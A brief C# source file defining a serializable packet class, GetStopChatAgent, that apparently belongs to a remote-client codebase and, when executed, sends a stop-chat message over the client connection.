using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class GetStopChatAgent : IPacket
    {


        string Sender { get; set; }

        public GetStopChatAgent()
        {
            Sender = "Agent";
        }


        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
